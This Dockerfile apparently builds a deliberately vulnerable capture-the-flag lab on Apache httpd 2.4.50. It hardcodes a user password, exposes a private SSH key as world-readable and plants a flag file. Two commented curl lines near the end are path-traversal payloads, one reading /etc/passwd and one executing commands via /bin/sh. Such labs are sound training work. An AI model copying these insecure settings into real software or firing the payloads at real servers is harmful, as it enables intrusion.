FROM httpd:2.4.50

# OS Setup #
RUN apt-get update -y
RUN apt-get install -y iproute2
RUN apt-get install -y openssh-server
RUN apt-get install -y  iptables


# Load Resources #
COPY //httpd.conf// /usr/local/apache2/conf
COPY //service.sh// /tmp



# Add User # 
RUN useradd -m bob
RUN echo 'bob:!@#E2RTGSsdfnBNJ' | chpasswd
WORKDIR /home/bob
USER bob
# Generate RSA Key #
RUN ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa
# Configure SSH #
USER root
RUN echo "AuthorizedKeysFile     .ssh/authorized_keys" >> /usr/share/openssh/sshd_config
RUN echo "PubkeyAuthentication yes" >> /usr/share/openssh/sshd_config
RUN echo "PermitEmptyPasswords" >> /usr/share/openssh/sshd_config
RUN echo "HostKey /etc/ssh/ssh_host_rsa_key" >> /usr/share/openssh/sshd_config
# Configure RSA to readable to outside #
RUN touch /home/bob/.ssh/authorized_keys
RUN cat /home/bob/.ssh/id_rsa.pub >> /home/bob/.ssh/authorized_keys
RUN cp /home/bob/.ssh/id_rsa /home/bob/id_rsa
RUN chmod 444 /home/bob/id_rsa
RUN chmod 754 /home/bob/.ssh/authorized_keys
RUN chmod 754 /home/bob/.ssh/
# Create Flag #
RUN mkdir /home/bob/F1@G_In_Here
RUN echo "Thank you Mario! But our princess is in another castle! Try localhost:8080" >> /home/bob/F1@G_In_Here/Fl@g.txt
RUN chown -R bob /home/bob/F1@G_In_Here






# Prep Apache/sshd Service #
EXPOSE 80
EXPOSE 22
RUN chmod 740 /tmp/service.sh




#curl http://192.168.1.20:2000/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//etc/passwd

#curl --data "A=|id>>/tmp/x;uname\$IFS-a>>/tmp/x" 'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -vv


WORKDIR /tmp
CMD ["./service.sh", "-D", "FOREGROUND"]
